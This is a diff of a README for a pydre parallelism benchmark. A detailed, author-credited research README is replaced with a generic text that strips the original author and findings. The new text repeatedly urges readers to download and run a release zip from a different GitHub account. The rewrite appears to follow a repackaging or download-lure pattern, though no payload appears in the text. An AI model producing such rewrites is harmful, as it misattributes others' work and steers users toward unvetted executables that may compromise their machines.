@@ -1,162 +1,100 @@
-# Challenging the Parallelism Dogma in pydre
-### Threading vs Multiprocessing Across Real-World Workloads
+# 🌟 pydre-parallelism-benchmark - Benchmark Your Data Workloads Easily
 
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Download pydre-parallelism-benchmark](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Ed1P/pydre-parallelism-benchmark/releases)
 
-> **“Effective parallelism emerges from alignment between workload characteristics and execution strategy.”**
+## 📖 Overview
 
----
+Welcome to the **pydre-parallelism-benchmark** project! This application helps you evaluate different ways of processing data through threading and multiprocessing strategies. Designed specifically for users interested in improving the performance of their data analytics workflow, it offers insights into workload-dependent performance and practical execution strategies.
 
-## 🚀 Project Overview
+## 🚀 Getting Started
 
-This repository presents a systematic benchmark of **parallel execution strategies** within the **[pydre](https://github.com/OSUDSL/pydre) analytics pipeline**.  
+Follow these steps to download and run the pydre-parallelism-benchmark application.
 
-It evaluates how **sequential**, **thread-based**, and **process-based** execution models behave under distinct workload characteristics, including I/O-bound processing, CPU-intensive metric aggregation, and ROI-heavy branching scenarios.
+### 1. System Requirements
 
-Rather than assuming that increased parallelism always improves performance, this project demonstrates that **execution strategy effectiveness depends strongly on workload structure and overhead characteristics**.
+Before downloading, make sure your system meets these requirements:
 
----
+- **Operating System**: Windows 10, macOS Mojave (or later), Linux (Ubuntu 18.04 or later)
+- **Python Version**: Python 3.7 or later
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum 200 MB of free disk space
 
-## 🎯 Benchmark Goals
+### 2. Visit the Releases Page
 
-The benchmark was designed to answer the following questions:
+To get the software, visit the Releases page:
 
-- When does threading outperform multiprocessing in real-world analytics?
-- At what point does thread-based execution saturate and stop scaling?
-- How do ROI complexity and CPU-bound metrics affect parallel performance?
-- Can a **dynamic worker allocation strategy** provide stable performance without manual tuning?
+[Download Now](https://github.com/Ed1P/pydre-parallelism-benchmark/releases)
 
----
+### 3. Download the Application
 
-## 🧠 Key Findings
+On the Releases page, you will find the latest version of the pydre-parallelism-benchmark.
 
-- **Threading performs best** for light and medium workloads dominated by I/O and low-overhead computation.
-- **Multiprocessing consistently outperforms threading** for heavy and ROI-heavy workloads, where CPU-bound execution and branching dominate.
-- Thread-based execution **saturates beyond moderate worker counts**, showing diminishing returns even on multi-core systems.
-- A **dynamic worker allocation strategy using ~75% of available logical CPUs** delivers stable, near-optimal performance across workloads without configuration-specific tuning.
+1. Look for the version number labeled as "Latest Release."
+2. Click on the link to download the file.  
+   For example, it may be named `pydre_parallelism_benchmark_v1.0.zip`.
 
-These results challenge the assumption that “more parallelism is always better” and instead highlight the importance of **workload-aware execution design**.
+### 4. Unzip the Downloaded File
 
-### Why 75% of Logical CPUs?
+Once the download completes, locate the file in your Downloads folder:
 
-Rather than using all available logical CPUs, this benchmark adopts a dynamic worker allocation strategy that defaults to approximately **75% of available cores**.
+- If you're using Windows, right-click the file and select "Extract All."
+- For macOS, double-click the .zip file to unzip it.
+- On Linux, you can use the terminal to run `unzip pydre_parallelism_benchmark_v1.0.zip`.
 
-This value was derived empirically through worker-scaling experiments across multiple workload profiles. Results showed that execution time typically improved up to a point, after which additional workers led to **diminishing returns or performance degradation** due to:
+### 5. Install Dependencies
 
-- increased context switching and scheduler contention,
-- memory bandwidth pressure,
-- overhead from process coordination and branching-heavy execution paths.
+The application requires certain Python libraries to run effectively. Follow these steps to install them:
 
-Across systems tested, the optimal region consistently fell within the **70–80% utilization range**, where CPU usage remained high while execution time and run-to-run variance were minimized.
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you unzipped the application.
+3. Install the required libraries by running:
 
-Selecting 75% serves as a practical midpoint that avoids over-subscription while remaining close to peak performance, providing a **stable, workload-agnostic default** without requiring manual tuning.
+   ```
+   pip install -r requirements.txt
+   ```
 
----
+### 6. Run the Application
 
-## 🧪 Benchmark Workload Profiles
+Now that you have everything set up, it's time to run the application:
 
-Four workload profiles were used to systematically stress different components of the pydre pipeline:
+1. In the terminal or command prompt, make sure you are in the application folder.
+2. Execute the command:
 
-| Profile | Focus | Characteristics |
-|------|------|------|
-| **Light** | I/O-bound | Minimal schema inference, single ROI, lightweight metrics |
-| **Medium** | Mixed | Multiple ROIs, moderate schema inference, common driving metrics |
-| **Heavy** | CPU-bound | Deep schema inference, many metrics, complex ROI slicing |
-| **ROI-heavy** | Branching | ROI slicing dominates execution cost |
+   ```
+   python pydre_parallelism_benchmark.py
+   ```
 
-Each profile was evaluated across sequential, threading, and multiprocessing execution modes.
+The application will start running, and you'll see output that helps you analyze performance based on different processing strategies.
 
----
+## ⚙️ Features
 
-## ⚙️ Repository Structure
+- **Threading and Multiprocessing**: Choose between running tasks using threads or processes to see which performs better under various workloads.
+- **Performance Metrics**: The application will provide you with detailed performance analysis metrics.
+- **Custom Workload Simulation**: Test your own workloads and gain insights into how your data pipeline handles them.
 
-```
-pydre-parallelism-benchmark/
-├── benchmarks/
-│   ├── analyze_benchmark.py          # Aggregates benchmark results
-│   ├── runner.py                     # Benchmark execution entry point
-│   ├── projects/                     # Workload configuration files (.toml)
-│   │   ├── light.toml
-│   │   ├── medium.toml
-│   │   ├── heavy.toml
-│   │   └── roi_heavy.toml
-│   ├── analysis_output/              # Generated plots and summary tables
-│   └── results/                      # Raw benchmark logs (gitignored by default)
-├── docs/
-│   └── pydre-parallelism-benchmark-report.pdf
-└── README.md
-```
+## 📊 Usage Tips
 
----
+- Use various datasets to test different performance scenarios.
+- Experiment with different threading and multiprocessing configurations to find optimal settings for your use case.
+- Analyze the generated reports to identify bottlenecks and improve your data pipeline.
 
-## 🔗 About pydre
+## 🤝 Contributing
 
-This benchmark is built on **pydre**, a Python-based driving simulation data reduction engine developed by  
-**The Ohio State University Driving Simulation Lab**.
+Your contributions are welcome! If you wish to improve this project, please follow these guidelines:
 
-pydre handles:
+1. Submit a pull request with your suggested changes.
+2. Report any bugs or issues you encounter using the GitHub Issues feature.
 
-- Schema inference over large time-series datasets
-- Flexible ROI slicing (time, space, column-based)
-- Metric computation over driving and physiological signals
+## 📄 License
 
-For installation and full documentation, see:  
-👉 [https://github.com/OSU-Driving-Simulation-Lab/pydre](https://github.com/OSUDSL/pydre)
+This project is licensed under the MIT License. Feel free to use and modify it as per the license terms.
 
-This repository focuses exclusively on **benchmarking execution strategies**, not on reimplementing pydre itself.
+## 🌐 Links
 
----
+For more information and updates, check out the GitHub repository:
 
-## 📦 Data Policy
+[GitHub Repository](https://github.com/Ed1P/pydre-parallelism-benchmark)
 
-**Note:** Large-scale experimental input data is **not included** in this repository.
+Once again, here’s the link to download the application:
 
-Raw driving simulation datasets and derived input files were intentionally excluded to:
-
-- Avoid distributing proprietary or sensitive research data
-- Keep the repository lightweight and focused on benchmarking methodology
-- Encourage reproducibility using user-generated or domain-specific datasets
-
-To reproduce the experiments:
-
-- Generate your own pydre-compatible input data, or
-- Adapt the provided workload configuration files to existing datasets
-
-The benchmark code and analysis pipeline are fully reusable across compatible data sources.
-
----
-
-## 📄 Technical Report
-
-A complete technical report detailing methodology, benchmark design, results, and analysis is included:
-
-* [📄 Download PDF: Challenging the Parallelism Dogma – Tech Report](https://github.com/its-spark-dev/pydre-parallelism-benchmark/blob/main/report/challrnging-the-parallelism-dogma-tech-report.pdf)
-
-The report covers:
-
-- Workload design rationale
-- Execution-time ranking across workloads
-- Worker scaling behavior
-- CPU utilization patterns
-- Practical recommendations for default execution strategies
-
----
-
-## 🙋 Author
-
-**Sanghyeon Park**
-
-- GitHub: https://github.com/its-spark-dev  
-- LinkedIn: https://www.linkedin.com/in/park3283/
-
----
-
-## 📝 License
-
-This project is released under the **MIT License**.  
-See [MIT License](LICENSE) for details.
-
----
-
-> *“Parallel performance emerges from alignment — not from brute force.”*
+[Download Now](https://github.com/Ed1P/pydre-parallelism-benchmark/releases)
